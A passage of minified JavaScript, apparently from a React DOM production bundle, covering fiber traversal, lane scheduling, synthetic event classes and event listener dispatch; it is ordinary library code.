n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(S(61))}if(n.style!=null&&typeof n.style!="object")throw Error(S(62))}}function ha(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var fa=null;function ml(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ma=null,mt=null,gt=null;function bo(e){if(e=Rs(e)){if(typeof ma!="function")throw Error(S(280));var n=e.stateNode;n&&(n=ai(n),ma(e.stateNode,e.type,n))}}function Nu(e){mt?gt?gt.push(e):gt=[e]:mt=e}function Au(){if(mt){var e=mt,n=gt;if(gt=mt=null,bo(e),n)for(e=0;e<n.length;e++)bo(n[e])}}function Pu(e,n){return e(n)}function Lu(){}var Ai=!1;function Ru(e,n,t){if(Ai)return e(n,t);Ai=!0;try{return Pu(e,n,t)}finally{Ai=!1,(mt!==null||gt!==null)&&(Lu(),Au())}}function os(e,n){var t=e.stateNode;if(t===null)return null;var s=ai(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(S(231,n,typeof t));return t}var ga=!1;if(nn)try{var It={};Object.defineProperty(It,"passive",{get:function(){ga=!0}}),window.addEventListener("test",It,It),window.removeEventListener("test",It,It)}catch{ga=!1}function Mh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(p){this.onError(p)}}var Zt=!1,_r=null,Er=!1,va=null,Dh={onError:function(e){Zt=!0,_r=e}};function zh(e,n,t,s,r,i,a,l,o){Zt=!1,_r=null,Mh.apply(Dh,arguments)}function Fh(e,n,t,s,r,i,a,l,o){if(zh.apply(this,arguments),Zt){if(Zt){var c=_r;Zt=!1,_r=null}else throw Error(S(198));Er||(Er=!0,va=c)}}function Jn(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Ou(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function xo(e){if(Jn(e)!==e)throw Error(S(188))}function Bh(e){var n=e.alternate;if(!n){if(n=Jn(e),n===null)throw Error(S(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return xo(r),e;if(i===s)return xo(r),n;i=i.sibling}throw Error(S(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(S(189))}}if(t.alternate!==s)throw Error(S(190))}if(t.tag!==3)throw Error(S(188));return t.stateNode.current===t?e:n}function ju(e){return e=Bh(e),e!==null?Iu(e):null}function Iu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Iu(e);if(n!==null)return n;e=e.sibling}return null}var Mu=be.unstable_scheduleCallback,So=be.unstable_cancelCallback,Uh=be.unstable_shouldYield,Hh=be.unstable_requestPaint,G=be.unstable_now,Vh=be.unstable_getCurrentPriorityLevel,gl=be.unstable_ImmediatePriority,Du=be.unstable_UserBlockingPriority,Tr=be.unstable_NormalPriority,Wh=be.unstable_LowPriority,zu=be.unstable_IdlePriority,ti=null,We=null;function $h(e){if(We&&typeof We.onCommitFiberRoot=="function")try{We.onCommitFiberRoot(ti,e,void 0,(e.current.flags&128)===128)}catch{}}var Me=Math.clz32?Math.clz32:qh,Gh=Math.log,Yh=Math.LN2;function qh(e){return e>>>=0,e===0?32:31-(Gh(e)/Yh|0)|0}var Ws=64,$s=4194304;function $t(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Cr(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=$t(l):(i&=a,i!==0&&(s=$t(i)))}else a=t&~r,a!==0?s=$t(a):i!==0&&(s=$t(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Me(n),r=1<<t,s|=e[t],n&=~r;return s}function Xh(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Kh(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-Me(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=Xh(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function ya(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Fu(){var e=Ws;return Ws<<=1,!(Ws&4194240)&&(Ws=64),e}function Pi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Ps(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Me(n),e[n]=t}function Qh(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-Me(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function vl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Me(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var M=0;function Bu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Uu,yl,Hu,Vu,Wu,wa=!1,Gs=[],wn=null,kn=null,bn=null,cs=new Map,us=new Map,fn=[],Zh="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function _o(e,n){switch(e){case"focusin":case"focusout":wn=null;break;case"dragenter":case"dragleave":kn=null;break;case"mouseover":case"mouseout":bn=null;break;case"pointerover":case"pointerout":cs.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":us.delete(n.pointerId)}}function Mt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Rs(n),n!==null&&yl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function Jh(e,n,t,s,r){switch(n){case"focusin":return wn=Mt(wn,e,n,t,s,r),!0;case"dragenter":return kn=Mt(kn,e,n,t,s,r),!0;case"mouseover":return bn=Mt(bn,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return cs.set(i,Mt(cs.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,us.set(i,Mt(us.get(i)||null,e,n,t,s,r)),!0}return!1}function $u(e){var n=zn(e.target);if(n!==null){var t=Jn(n);if(t!==null){if(n=t.tag,n===13){if(n=Ou(t),n!==null){e.blockedOn=n,Wu(e.priority,function(){Hu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function ur(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=ka(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);fa=s,t.target.dispatchEvent(s),fa=null}else return n=Rs(t),n!==null&&yl(n),e.blockedOn=t,!1;n.shift()}return!0}function Eo(e,n,t){ur(e)&&t.delete(n)}function ef(){wa=!1,wn!==null&&ur(wn)&&(wn=null),kn!==null&&ur(kn)&&(kn=null),bn!==null&&ur(bn)&&(bn=null),cs.forEach(Eo),us.forEach(Eo)}function Dt(e,n){e.blockedOn===n&&(e.blockedOn=null,wa||(wa=!0,be.unstable_scheduleCallback(be.unstable_NormalPriority,ef)))}function ps(e){function n(r){return Dt(r,e)}if(0<Gs.length){Dt(Gs[0],e);for(var t=1;t<Gs.length;t++){var s=Gs[t];s.blockedOn===e&&(s.blockedOn=null)}}for(wn!==null&&Dt(wn,e),kn!==null&&Dt(kn,e),bn!==null&&Dt(bn,e),cs.forEach(n),us.forEach(n),t=0;t<fn.length;t++)s=fn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<fn.length&&(t=fn[0],t.blockedOn===null);)$u(t),t.blockedOn===null&&fn.shift()}var vt=ln.ReactCurrentBatchConfig,Nr=!0;function nf(e,n,t,s){var r=M,i=vt.transition;vt.transition=null;try{M=1,wl(e,n,t,s)}finally{M=r,vt.transition=i}}function tf(e,n,t,s){var r=M,i=vt.transition;vt.transition=null;try{M=4,wl(e,n,t,s)}finally{M=r,vt.transition=i}}function wl(e,n,t,s){if(Nr){var r=ka(e,n,t,s);if(r===null)Bi(e,n,s,Ar,t),_o(e,s);else if(Jh(r,e,n,t,s))s.stopPropagation();else if(_o(e,s),n&4&&-1<Zh.indexOf(e)){for(;r!==null;){var i=Rs(r);if(i!==null&&Uu(i),i=ka(e,n,t,s),i===null&&Bi(e,n,s,Ar,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else Bi(e,n,s,null,t)}}var Ar=null;function ka(e,n,t,s){if(Ar=null,e=ml(s),e=zn(e),e!==null)if(n=Jn(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Ou(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Ar=e,null}function Gu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Vh()){case gl:return 1;case Du:return 4;case Tr:case Wh:return 16;case zu:return 536870912;default:return 16}default:return 16}}var gn=null,kl=null,pr=null;function Yu(){if(pr)return pr;var e,n=kl,t=n.length,s,r="value"in gn?gn.value:gn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return pr=r.slice(e,1<s?1-s:void 0)}function dr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function Ys(){return!0}function To(){return!1}function Se(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?Ys:To,this.isPropagationStopped=To,this}return V(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=Ys)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=Ys)},persist:function(){},isPersistent:Ys}),n}var Lt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},bl=Se(Lt),Ls=V({},Lt,{view:0,detail:0}),sf=Se(Ls),Li,Ri,zt,si=V({},Ls,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:xl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==zt&&(zt&&e.type==="mousemove"?(Li=e.screenX-zt.screenX,Ri=e.screenY-zt.screenY):Ri=Li=0,zt=e),Li)},movementY:function(e){return"movementY"in e?e.movementY:Ri}}),Co=Se(si),rf=V({},si,{dataTransfer:0}),af=Se(rf),lf=V({},Ls,{relatedTarget:0}),Oi=Se(lf),of=V({},Lt,{animationName:0,elapsedTime:0,pseudoElement:0}),cf=Se(of),uf=V({},Lt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),pf=Se(uf),df=V({},Lt,{data:0}),No=Se(df),hf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},ff={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},mf={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function gf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=mf[e])?!!n[e]:!1}function xl(){return gf}var vf=V({},Ls,{key:function(e){if(e.key){var n=hf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=dr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?ff[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:xl,charCode:function(e){return e.type==="keypress"?dr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?dr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),yf=Se(vf),wf=V({},si,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Ao=Se(wf),kf=V({},Ls,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:xl}),bf=Se(kf),xf=V({},Lt,{propertyName:0,elapsedTime:0,pseudoElement:0}),Sf=Se(xf),_f=V({},si,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Ef=Se(_f),Tf=[9,13,27,32],Sl=nn&&"CompositionEvent"in window,Jt=null;nn&&"documentMode"in document&&(Jt=document.documentMode);var Cf=nn&&"TextEvent"in window&&!Jt,qu=nn&&(!Sl||Jt&&8<Jt&&11>=Jt),Po=" ",Lo=!1;function Xu(e,n){switch(e){case"keyup":return Tf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ku(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var rt=!1;function Nf(e,n){switch(e){case"compositionend":return Ku(n);case"keypress":return n.which!==32?null:(Lo=!0,Po);case"textInput":return e=n.data,e===Po&&Lo?null:e;default:return null}}function Af(e,n){if(rt)return e==="compositionend"||!Sl&&Xu(e,n)?(e=Yu(),pr=kl=gn=null,rt=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return qu&&n.locale!=="ko"?null:n.data;default:return null}}var Pf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Ro(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Pf[e.type]:n==="textarea"}function Qu(e,n,t,s){Nu(s),n=Pr(n,"onChange"),0<n.length&&(t=new bl("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var es=null,ds=null;function Lf(e){op(e,0)}function ri(e){var n=lt(e);if(bu(n))return e}function Rf(e,n){if(e==="change")return n}var Zu=!1;if(nn){var ji;if(nn){var Ii="oninput"in document;if(!Ii){var Oo=document.createElement("div");Oo.setAttribute("oninput","return;"),Ii=typeof Oo.oninput=="function"}ji=Ii}else ji=!1;Zu=ji&&(!document.documentMode||9<document.documentMode)}function jo(){es&&(es.detachEvent("onpropertychange",Ju),ds=es=null)}function Ju(e){if(e.propertyName==="value"&&ri(ds)){var n=[];Qu(n,ds,e,ml(e)),Ru(Lf,n)}}function Of(e,n,t){e==="focusin"?(jo(),es=n,ds=t,es.attachEvent("onpropertychange",Ju)):e==="focusout"&&jo()}function jf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return ri(ds)}function If(e,n){if(e==="click")return ri(n)}function Mf(e,n){if(e==="input"||e==="change")return ri(n)}function Df(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var ze=typeof Object.is=="function"?Object.is:Df;function hs(e,n){if(ze(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!ta.call(n,r)||!ze(e[r],n[r]))return!1}return!0}function Io(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Mo(e,n){var t=Io(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Io(t)}}function ep(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?ep(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function np(){for(var e=window,n=Sr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Sr(e.document)}return n}function _l(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function zf(e){var n=np(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&ep(t.ownerDocument.documentElement,t)){if(s!==null&&_l(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=Mo(t,i);var a=Mo(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Ff=nn&&"documentMode"in document&&11>=document.documentMode,it=null,ba=null,ns=null,xa=!1;function Do(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;xa||it==null||it!==Sr(s)||(s=it,"selectionStart"in s&&_l(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ns&&hs(ns,s)||(ns=s,s=Pr(ba,"onSelect"),0<s.length&&(n=new bl("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=it)))}function qs(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var at={animationend:qs("Animation","AnimationEnd"),animationiteration:qs("Animation","AnimationIteration"),animationstart:qs("Animation","AnimationStart"),transitionend:qs("Transition","TransitionEnd")},Mi={},tp={};nn&&(tp=document.createElement("div").style,"AnimationEvent"in window||(delete at.animationend.animation,delete at.animationiteration.animation,delete at.animationstart.animation),"TransitionEvent"in window||delete at.transitionend.transition);function ii(e){if(Mi[e])return Mi[e];if(!at[e])return e;var n=at[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in tp)return Mi[e]=n[t];return e}var sp=ii("animationend"),rp=ii("animationiteration"),ip=ii("animationstart"),ap=ii("transitionend"),lp=new Map,zo="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Pn(e,n){lp.set(e,n),Zn(n,[e])}for(var Di=0;Di<zo.length;Di++){var zi=zo[Di],Bf=zi.toLowerCase(),Uf=zi[0].toUpperCase()+zi.slice(1);Pn(Bf,"on"+Uf)}Pn(sp,"onAnimationEnd");Pn(rp,"onAnimationIteration");Pn(ip,"onAnimationStart");Pn("dblclick","onDoubleClick");Pn("focusin","onFocus");Pn("focusout","onBlur");Pn(ap,"onTransitionEnd");bt("onMouseEnter",["mouseout","mouseover"]);bt("onMouseLeave",["mouseout","mouseover"]);bt("onPointerEnter",["pointerout","pointerover"]);bt("onPointerLeave",["pointerout","pointerover"]);Zn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Zn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Zn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Zn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Zn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Zn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Gt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Hf=new Set("cancel close invalid load scroll toggle".split(" ").concat(Gt));function Fo(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Fh(s,n,void 0,e),e.currentTarget=null}function op(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;Fo(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;Fo(r,l,c),i=o}}}if(Er)throw e=va,Er=!1,va=null,e}function z(e,n){var t=n[Ca];t===void 0&&(t=n[Ca]=new Set);var s=e+"__bubble";t.has(s)||(cp(n,e,2,!1),t.add(s))}function Fi(e,n,t){var s=0;n&&(s|=4),cp(t,e,s,n)}var Xs="_reactListening"+Math.random().toString(36).slice(2);function fs(e){if(!e[Xs]){e[Xs]=!0,gu.forEach(function(t){t!=="selectionchange"&&(Hf.has(t)||Fi(t,!1,e),Fi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[Xs]||(n[Xs]=!0,Fi("selectionchange",!1,n))}}function cp(e,n,t,s){switch(Gu(n)){case 1:var r=nf;break;case 4:r=tf;break;default:r=wl}t=r.bind(null,n,t,e),r=void 0,!ga||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Bi(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=zn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Ru(function(){var c=i,p=ml(t),d=[];e:{var h=lp.get(e);if(h!==void 0){var v=bl,y=e;switch(e){case"keypress":if(dr(t)===0)break e;case"keydown":case"keyup":v=yf;break;case"focusin":y="focus",v=Oi;break;case"focusout":y="blur",v=Oi;break;case"beforeblur":case"afterblur":v=Oi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Co;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=af;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=bf;break;case sp:case rp:case ip:v=cf;break;case ap:v=Sf;break;case"scroll":v=sf;break;case"wheel":v=Ef;break;case"copy":case"cut":case"paste":v=pf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Ao}var w=(n&4)!==0,x=!w&&e==="scroll",m=w?h!==null?h+"Capture":null:h;w=[];for(var f=c,g;f!==null;){g=f;var k=g.stateNode;if(g.tag===5&&k!==null&&(g=k,m!==null&&(k=os(f,m),k!=null&&w.push(ms(f,k,g)))),x)break;f=f.return}0<w.length&&(h=new v(h,y,null,t,p),d.push({event:h,listeners:w}))}}if(!(n&7)){e:{if(h=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",h&&t!==fa&&(y=t.relatedTarget||t.fromElement)&&(zn(y)||y[tn]))break e;if((v||h)&&(h=p.window===p?p:(h=p.ownerDocument)?h.defaultView||h.parentWindow:window,v?(y=t.relatedTarget||t.toElement,v=c,y=y?zn(y):null,y!==null&&(x=Jn(y),y!==x||y.tag!==5&&y.tag!==6)&&(y=null)):(v=null,y=c),v!==y)){if(w=Co,k="onMouseLeave",m="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(w=Ao,k="onPointerLeave",m="onPointerEnter",f="pointer"),x=v==null?h:lt(v),g=y==null?h:lt(y),h=new 